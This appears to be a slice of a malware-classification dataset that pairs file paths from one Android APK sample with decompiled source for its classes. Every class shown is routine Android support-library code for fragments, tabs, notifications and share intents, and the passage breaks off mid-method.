"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentContainer.code","interface FragmentContainer {   View findViewById(  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentManager.code","public abstract class FragmentManager {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface BackStackEntry {     CharSequence getBreadCrumbShortTitle();     int getBreadCrumbShortTitleRes();     CharSequence getBreadCrumbTitle();     int getBreadCrumbTitleRes();     int getId();     String getName();   } public interface OnBackStackChangedListener {     void onBackStackChanged();   }   public abstract void addOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract FragmentTransaction beginTransaction();   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract boolean executePendingTransactions();   public abstract Fragment findFragmentById(  int i);   public abstract Fragment findFragmentByTag(  String str);   public abstract BackStackEntry getBackStackEntryAt(  int i);   public abstract int getBackStackEntryCount();   public abstract Fragment getFragment(  Bundle bundle,  String str);   public abstract List<Fragment> getFragments();   public abstract void popBackStack();   public abstract void popBackStack(  int i,  int i2);   public abstract void popBackStack(  String str,  int i);   public abstract boolean popBackStackImmediate();   public abstract boolean popBackStackImmediate(  int i,  int i2);   public abstract boolean popBackStackImmediate(  String str,  int i);   public abstract void putFragment(  Bundle bundle,  String str,  Fragment fragment);   public abstract void removeOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract Fragment.SavedState saveFragmentInstanceState(  Fragment fragment);   @Deprecated public FragmentTransaction openTransaction(){     return beginTransaction();   }   public static void enableDebugLogging(  boolean enabled){     FragmentManagerImpl.DEBUG=enabled;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentManagerImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@61ee9672"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel in){       return new FragmentManagerState(in);     }     @Override public FragmentManagerState[] newArray(    int size){       return new FragmentManagerState[size];     }   } ;   FragmentState[] mActive;   int[] mAdded;   BackStackState[] mBackStack;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel in){     this.mActive=(FragmentState[])in.createTypedArray(FragmentState.CREATOR);     this.mAdded=in.createIntArray();     this.mBackStack=(BackStackState[])in.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeTypedArray(this.mActive,flags);     dest.writeIntArray(this.mAdded);     dest.writeTypedArray(this.mBackStack,flags);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentPagerAdapter.code","public abstract class FragmentPagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentPagerAdapter"";   private FragmentTransaction mCurTransaction=null;   private Fragment mCurrentPrimaryItem=null;   private final FragmentManager mFragmentManager;   public abstract Fragment getItem(  int i);   public FragmentPagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     long itemId=getItemId(position);     String name=makeFragmentName(container.getId(),itemId);     Fragment fragment=this.mFragmentManager.findFragmentByTag(name);     if (fragment != null) {       this.mCurTransaction.attach(fragment);     }  else {       fragment=getItem(position);       this.mCurTransaction.add(container.getId(),fragment,makeFragmentName(container.getId(),itemId));     }     if (fragment != this.mCurrentPrimaryItem) {       fragment.setMenuVisibility(false);       fragment.setUserVisibleHint(false);     }     return fragment;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     this.mCurTransaction.detach((Fragment)object);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(false);         this.mCurrentPrimaryItem.setUserVisibleHint(false);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     return ((Fragment)object).getView() == view;   }   @Override public Parcelable saveState(){     return null;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){   }   public long getItemId(  int position){     return position;   }   private static String makeFragmentName(  int viewId,  long id){     return ""android:switcher:"" + viewId + "":""+ id;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel in){       return new FragmentState(in);     }     @Override public FragmentState[] newArray(    int size){       return new FragmentState[size];     }   } ;   final Bundle mArguments;   final String mClassName;   final int mContainerId;   final boolean mDetached;   final int mFragmentId;   final boolean mFromLayout;   final int mIndex;   Fragment mInstance;   final boolean mRetainInstance;   Bundle mSavedFragmentState;   final String mTag;   public FragmentState(  Fragment frag){     this.mClassName=frag.getClass().getName();     this.mIndex=frag.mIndex;     this.mFromLayout=frag.mFromLayout;     this.mFragmentId=frag.mFragmentId;     this.mContainerId=frag.mContainerId;     this.mTag=frag.mTag;     this.mRetainInstance=frag.mRetainInstance;     this.mDetached=frag.mDetached;     this.mArguments=frag.mArguments;   }   public FragmentState(  Parcel in){     this.mClassName=in.readString();     this.mIndex=in.readInt();     this.mFromLayout=in.readInt() != 0;     this.mFragmentId=in.readInt();     this.mContainerId=in.readInt();     this.mTag=in.readString();     this.mRetainInstance=in.readInt() != 0;     this.mDetached=in.readInt() != 0;     this.mArguments=in.readBundle();     this.mSavedFragmentState=in.readBundle();   }   public Fragment instantiate(  FragmentActivity activity,  Fragment parent){     if (this.mInstance != null) {       return this.mInstance;     }     if (this.mArguments != null) {       this.mArguments.setClassLoader(activity.getClassLoader());     }     this.mInstance=Fragment.instantiate(activity,this.mClassName,this.mArguments);     if (this.mSavedFragmentState != null) {       this.mSavedFragmentState.setClassLoader(activity.getClassLoader());       this.mInstance.mSavedFragmentState=this.mSavedFragmentState;     }     this.mInstance.setIndex(this.mIndex,parent);     this.mInstance.mFromLayout=this.mFromLayout;     this.mInstance.mRestored=true;     this.mInstance.mFragmentId=this.mFragmentId;     this.mInstance.mContainerId=this.mContainerId;     this.mInstance.mTag=this.mTag;     this.mInstance.mRetainInstance=this.mRetainInstance;     this.mInstance.mDetached=this.mDetached;     this.mInstance.mFragmentManager=activity.mFragments;     if (FragmentManagerImpl.DEBUG) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.mInstance);     }     return this.mInstance;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeString(this.mClassName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mFromLayout ? 1 : 0);     dest.writeInt(this.mFragmentId);     dest.writeInt(this.mContainerId);     dest.writeString(this.mTag);     dest.writeInt(this.mRetainInstance ? 1 : 0);     dest.writeInt(this.mDetached ? 1 : 0);     dest.writeBundle(this.mArguments);     dest.writeBundle(this.mSavedFragmentState);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentStatePagerAdapter.code","public abstract class FragmentStatePagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentStatePagerAdapter"";   private final FragmentManager mFragmentManager;   private FragmentTransaction mCurTransaction=null;   private ArrayList<Fragment.SavedState> mSavedState=new ArrayList<>();   private ArrayList<Fragment> mFragments=new ArrayList<>();   private Fragment mCurrentPrimaryItem=null;   public abstract Fragment getItem(  int i);   public FragmentStatePagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     Fragment.SavedState fss;     Fragment f;     if (this.mFragments.size() <= position || (f=this.mFragments.get(position)) == null) {       if (this.mCurTransaction == null) {         this.mCurTransaction=this.mFragmentManager.beginTransaction();       }       Fragment fragment=getItem(position);       if (this.mSavedState.size() > position && (fss=this.mSavedState.get(position)) != null) {         fragment.setInitialSavedState(fss);       }       while (this.mFragments.size() <= position) {         this.mFragments.add(null);       }       fragment.setMenuVisibility(false);       fragment.setUserVisibleHint(false);       this.mFragments.set(position,fragment);       this.mCurTransaction.add(container.getId(),fragment);       return fragment;     }     return f;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     while (this.mSavedState.size() <= position) {       this.mSavedState.add(null);     }     this.mSavedState.set(position,this.mFragmentManager.saveFragmentInstanceState(fragment));     this.mFragments.set(position,null);     this.mCurTransaction.remove(fragment);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(false);         this.mCurrentPrimaryItem.setUserVisibleHint(false);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     return ((Fragment)object).getView() == view;   }   @Override public Parcelable saveState(){     Bundle state=null;     if (this.mSavedState.size() > 0) {       state=new Bundle();       Fragment.SavedState[] fss=new Fragment.SavedState[this.mSavedState.size()];       this.mSavedState.toArray(fss);       state.putParcelableArray(""states"",fss);     }     for (int i=0; i < this.mFragments.size(); i++) {       Fragment f=this.mFragments.get(i);       if (f != null) {         if (state == null) {           state=new Bundle();         }         String key=""f"" + i;         this.mFragmentManager.putFragment(state,key,f);       }     }     return state;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){     if (state != null) {       Bundle bundle=(Bundle)state;       bundle.setClassLoader(loader);       Parcelable[] fss=bundle.getParcelableArray(""states"");       this.mSavedState.clear();       this.mFragments.clear();       if (fss != null) {         for (        Parcelable parcelable : fss) {           this.mSavedState.add((Fragment.SavedState)parcelable);         }       }       Iterable<String> keys=bundle.keySet();       for (      String key : keys) {         if (key.startsWith(""f"")) {           int index=Integer.parseInt(key.substring(1));           Fragment f=this.mFragmentManager.getFragment(bundle,key);           if (f != null) {             while (this.mFragments.size() <= index) {               this.mFragments.add(null);             }             f.setMenuVisibility(false);             this.mFragments.set(index,f);           }  else {             Log.w(TAG,""Bad fragment at key "" + key);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentTabHost.code","public class FragmentTabHost extends TabHost implements TabHost.OnTabChangeListener {   private boolean mAttached;   private int mContainerId;   private Context mContext;   private FragmentManager mFragmentManager;   private TabInfo mLastTab;   private TabHost.OnTabChangeListener mOnTabChangeListener;   private FrameLayout mRealTabContent;   private final ArrayList<TabInfo> mTabs; public static final class TabInfo {     private final Bundle args;     private final Class<?> clss;     private Fragment fragment;     private final String tag;     TabInfo(    String _tag,    Class<?> _class,    Bundle _args){       this.tag=_tag;       this.clss=_class;       this.args=_args;     }   } static class DummyTabFactory implements TabHost.TabContentFactory {     private final Context mContext;     public DummyTabFactory(    Context context){       this.mContext=context;     }     @Override public View createTabContent(    String tag){       View v=new View(this.mContext);       v.setMinimumWidth(0);       v.setMinimumHeight(0);       return v;     }   } public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     String curTab;     SavedState(    Parcelable superState){       super(superState);     }     private SavedState(    Parcel in){       super(in);       this.curTab=in.readString();     }     @Override public void writeToParcel(    Parcel out,    int flags){       super.writeToParcel(out,flags);       out.writeString(this.curTab);     }     public String toString(){       return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";     }   }   public FragmentTabHost(  Context context){     super(context,null);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,null);   }   public FragmentTabHost(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,attrs);   }   private void initFragmentTabHost(  Context context,  AttributeSet attrs){     TypedArray a2=context.obtainStyledAttributes(attrs,new int[]{R.attr.inflatedId},0,0);     this.mContainerId=a2.getResourceId(0,0);     a2.recycle();     super.setOnTabChangedListener(this);   }   private void ensureHierarchy(  Context context){     if (findViewById(R.id.tabs) == null) {       LinearLayout ll=new LinearLayout(context);       ll.setOrientation(1);       addView(ll,new FrameLayout.LayoutParams(-1,-1));       TabWidget tw=new TabWidget(context);       tw.setId(R.id.tabs);       tw.setOrientation(0);       ll.addView(tw,new LinearLayout.LayoutParams(-1,-2,0.0f));       FrameLayout fl=new FrameLayout(context);       fl.setId(R.id.tabcontent);       ll.addView(fl,new LinearLayout.LayoutParams(0,0,0.0f));       FrameLayout fl2=new FrameLayout(context);       this.mRealTabContent=fl2;       this.mRealTabContent.setId(this.mContainerId);       ll.addView(fl2,new LinearLayout.LayoutParams(-1,0,1.0f));     }   }   @Override @Deprecated public void setup(){     throw new IllegalStateException(""Must call setup() that takes a Context and FragmentManager"");   }   public void setup(  Context context,  FragmentManager manager){     ensureHierarchy(context);     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     ensureContent();   }   public void setup(  Context context,  FragmentManager manager,  int containerId){     ensureHierarchy(context);     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     this.mContainerId=containerId;     ensureContent();     this.mRealTabContent.setId(containerId);     if (getId() == -1) {       setId(R.id.tabhost);     }   }   private void ensureContent(){     if (this.mRealTabContent == null) {       this.mRealTabContent=(FrameLayout)findViewById(this.mContainerId);       if (this.mRealTabContent == null) {         throw new IllegalStateException(""No tab content FrameLayout found for id "" + this.mContainerId);       }     }   }   @Override public void setOnTabChangedListener(  TabHost.OnTabChangeListener l){     this.mOnTabChangeListener=l;   }   public void addTab(  TabHost.TabSpec tabSpec,  Class<?> clss,  Bundle args){     tabSpec.setContent(new DummyTabFactory(this.mContext));     String tag=tabSpec.getTag();     TabInfo info=new TabInfo(tag,clss,args);     if (this.mAttached) {       info.fragment=this.mFragmentManager.findFragmentByTag(tag);       if (info.fragment != null && !info.fragment.isDetached()) {         FragmentTransaction ft=this.mFragmentManager.beginTransaction();         ft.detach(info.fragment);         ft.commit();       }     }     this.mTabs.add(info);     addTab(tabSpec);   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     String currentTab=getCurrentTabTag();     FragmentTransaction ft=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       tab.fragment=this.mFragmentManager.findFragmentByTag(tab.tag);       if (tab.fragment != null && !tab.fragment.isDetached()) {         if (tab.tag.equals(currentTab)) {           this.mLastTab=tab;         }  else {           if (ft == null) {             ft=this.mFragmentManager.beginTransaction();           }           ft.detach(tab.fragment);         }       }     }     this.mAttached=true;     FragmentTransaction ft2=doTabChanged(currentTab,ft);     if (ft2 != null) {       ft2.commit();       this.mFragmentManager.executePendingTransactions();     }   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.mAttached=false;   }   @Override protected Parcelable onSaveInstanceState(){     Parcelable superState=super.onSaveInstanceState();     SavedState ss=new SavedState(superState);     ss.curTab=getCurrentTabTag();     return ss;   }   @Override protected void onRestoreInstanceState(  Parcelable state){     SavedState ss=(SavedState)state;     super.onRestoreInstanceState(ss.getSuperState());     setCurrentTabByTag(ss.curTab);   }   @Override public void onTabChanged(  String tabId){     FragmentTransaction ft;     if (this.mAttached && (ft=doTabChanged(tabId,null)) != null) {       ft.commit();     }     if (this.mOnTabChangeListener != null) {       this.mOnTabChangeListener.onTabChanged(tabId);     }   }   private FragmentTransaction doTabChanged(  String tabId,  FragmentTransaction ft){     TabInfo newTab=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       if (tab.tag.equals(tabId)) {         newTab=tab;       }     }     if (newTab == null) {       throw new IllegalStateException(""No tab known for tag "" + tabId);     }     if (this.mLastTab != newTab) {       if (ft == null) {         ft=this.mFragmentManager.beginTransaction();       }       if (this.mLastTab != null && this.mLastTab.fragment != null) {         ft.detach(this.mLastTab.fragment);       }       if (newTab != null) {         if (newTab.fragment == null) {           newTab.fragment=Fragment.instantiate(this.mContext,newTab.clss.getName(),newTab.args);           ft.add(this.mContainerId,newTab.fragment,newTab.tag);         }  else {           ft.attach(newTab.fragment);         }       }       this.mLastTab=newTab;     }     return ft;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentTag.code","static class FragmentTag {   public static final int[] Fragment={R.attr.name,R.attr.id,R.attr.tag};   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   FragmentTag(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentTransaction.code","public abstract class FragmentTransaction {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1;   public abstract FragmentTransaction add(  int i,  Fragment fragment);   public abstract FragmentTransaction add(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction add(  Fragment fragment,  String str);   public abstract FragmentTransaction addToBackStack(  String str);   public abstract FragmentTransaction attach(  Fragment fragment);   public abstract int commit();   public abstract int commitAllowingStateLoss();   public abstract FragmentTransaction detach(  Fragment fragment);   public abstract FragmentTransaction disallowAddToBackStack();   public abstract FragmentTransaction hide(  Fragment fragment);   public abstract boolean isAddToBackStackAllowed();   public abstract boolean isEmpty();   public abstract FragmentTransaction remove(  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction setBreadCrumbShortTitle(  int i);   public abstract FragmentTransaction setBreadCrumbShortTitle(  CharSequence charSequence);   public abstract FragmentTransaction setBreadCrumbTitle(  int i);   public abstract FragmentTransaction setBreadCrumbTitle(  CharSequence charSequence);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2,  int i3,  int i4);   public abstract FragmentTransaction setTransition(  int i);   public abstract FragmentTransaction setTransitionStyle(  int i);   public abstract FragmentTransaction show(  Fragment fragment); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\InboxStyle.code","public static class InboxStyle extends Style {   ArrayList<CharSequence> mTexts=new ArrayList<>();   public InboxStyle(){   }   public InboxStyle(  Builder builder){     setBuilder(builder);   }   public InboxStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public InboxStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public InboxStyle addLine(  CharSequence cs){     this.mTexts.add(cs);     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\InstantiationException.code","public static class InstantiationException extends RuntimeException {   public InstantiationException(  String msg,  Exception cause){     super(msg,cause);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\IntentBuilder.code","public static class IntentBuilder {   private Activity mActivity;   private ArrayList<String> mBccAddresses;   private ArrayList<String> mCcAddresses;   private CharSequence mChooserTitle;   private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");   private ArrayList<Uri> mStreams;   private ArrayList<String> mToAddresses;   public static IntentBuilder from(  Activity launchingActivity){     return new IntentBuilder(launchingActivity);   }   private IntentBuilder(  Activity launchingActivity){     this.mActivity=launchingActivity;     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());     this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);   }   public Intent getIntent(){     if (this.mToAddresses != null) {       combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);       this.mToAddresses=null;     }     if (this.mCcAddresses != null) {       combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);       this.mCcAddresses=null;     }     if (this.mBccAddresses != null) {       combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);       this.mBccAddresses=null;     }     boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;     boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     if (!needsSendMultiple && isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }       this.mStreams=null;     }     if (needsSendMultiple && !isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }     }     return this.mIntent;   }   Activity getActivity(){     return this.mActivity;   }   private void combineArrayExtra(  String extra,  ArrayList<String> add){     String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);     int currentLength=currentAddresses != null ? currentAddresses.length : 0;     String[] finalAddresses=new String[add.size() + currentLength];     add.toArray(finalAddresses);     if (currentAddresses != null) {       System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);     }     this.mIntent.putExtra(extra,finalAddresses);   }   private void combineArrayExtra(  String extra,  String[] add){     Intent intent=getIntent();     String[] old=intent.getStringArrayExtra(extra);     int oldLength=old != null ? old.length : 0;     String[] result=new String[add.length + oldLength];     if (old != null) {       System.arraycopy(old,0,result,0,oldLength);     }     System.arraycopy(add,0,result,oldLength,add.length);     intent.putExtra(extra,result);   }   public Intent createChooserIntent(){     return Intent.createChooser(getIntent(),this.mChooserTitle);   }   public void startChooser(){     this.mActivity.startActivity(createChooserIntent());   }   public IntentBuilder setChooserTitle(  CharSequence title){     this.mChooserTitle=title;     return this;   }   public IntentBuilder setChooserTitle(  int resId){     return setChooserTitle(this.mActivity.getText(resId));   }   public IntentBuilder setType(  String mimeType){     this.mIntent.setType(mimeType);     return this;   }   public IntentBuilder setText(  CharSequence text){     this.mIntent.putExtra(""android.intent.extra.TEXT"",text);     return this;   }   public IntentBuilder setHtmlText(  String htmlText){     this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);     if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {       setText(Html.fromHtml(htmlText));     }     return this;   }   public IntentBuilder setStream(  Uri streamUri){     if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {       this.mIntent.setAction(""android.intent.action.SEND"");     }     this.mStreams=null;     this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);     return this;   }   public IntentBuilder addStream(  Uri streamUri){     Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     if (currentStream == null) {       return setStream(streamUri);     }     if (this.mStreams == null) {       this.mStreams=new ArrayList<>();     }     if (currentStream != null) {       this.mIntent.removeExtra(""android.intent.extra.STREAM"");       this.mStreams.add(currentStream);     }     this.mStreams.add(streamUri);     return this;   }   public IntentBuilder setEmailTo(  String[] addresses){     if (this.mToAddresses != null) {       this.mToAddresses=null;     }     this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder addEmailTo(  String address){     if (this.mToAddresses == null) {       this.mToAddresses=new ArrayList<>();     }     this.mToAddresses.add(address);     return this;   }   public IntentBuilder addEmailTo(  String[] addresses){     combineArrayExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder setEmailCc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder addEmailCc(  String address){     if (this.mCcAddresses == null) {       this.mCcAddresses=new ArrayList<>();     }     this.mCcAddresses.add(address);     return this;   }   public IntentBuilder addEmailCc(  String[] addresses){     combineArrayExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder setEmailBcc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder addEmailBcc(  String address){     if (this.mBccAddresses == null) {       this.mBccAddresses=new ArrayList<>();     }     this.mBccAddresses.add(address);     return this;   }   public IntentBuilder addEmailBcc(  String[] addresses){     combineArrayExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder setSubject(  String subject){     this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\IntentReader.code","public static class IntentReader {   private static final String TAG=""IntentReader"";   private Activity mActivity;   private ComponentName mCallingActivity;   private String mCallingPackage;   private Intent mIntent;   private ArrayList<Uri> mStreams;   public static IntentReader from(  Activity activity){     return new IntentReader(activity);   }   private IntentReader(  Activity activity){     this.mActivity=activity;     this.mIntent=activity.getIntent();     this.mCallingPackage=ShareCompat.getCallingPackage(activity);     this.mCallingActivity=ShareCompat.getCallingActivity(activity);   }   public boolean isShareIntent(){     String action=this.mIntent.getAction();     return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);   }   public boolean isSingleShare(){     return ""android.intent.action.SEND"".equals(this.mIntent.getAction());   }   public boolean isMultipleShare(){     return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());   }   public String getType(){     return this.mIntent.getType();   }   public CharSequence getText(){     return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");   }   public String getHtmlText(){     String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);     if (result == null) {       CharSequence text=getText();       if (text instanceof Spanned) {         return Html.toHtml((Spanned)text);       }       if (text != null) {         return ShareCompat.IMPL.escapeHtml(text);       }       return result;     }     return result;   }   public Uri getStream(){     return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");   }   public Uri getStream(  int index){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.get(index);     }     if (index == 0) {       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);   }   public int getStreamCount(){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.size();     }     return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;   }   public String[] getEmailTo(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");   }   public String[] getEmailCc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");   }   public String[] getEmailBcc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");   }   public String getSubject(){     return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");   }   public String getCallingPackage(){     return this.mCallingPackage;   }   public ComponentName getCallingActivity(){     return this.mCallingActivity;   }   public Drawable getCallingActivityIcon(){     if (this.mCallingActivity == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getActivityIcon(this.mCallingActivity);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling activity"",e);       return null;     }   }   public Drawable getCallingApplicationIcon(){   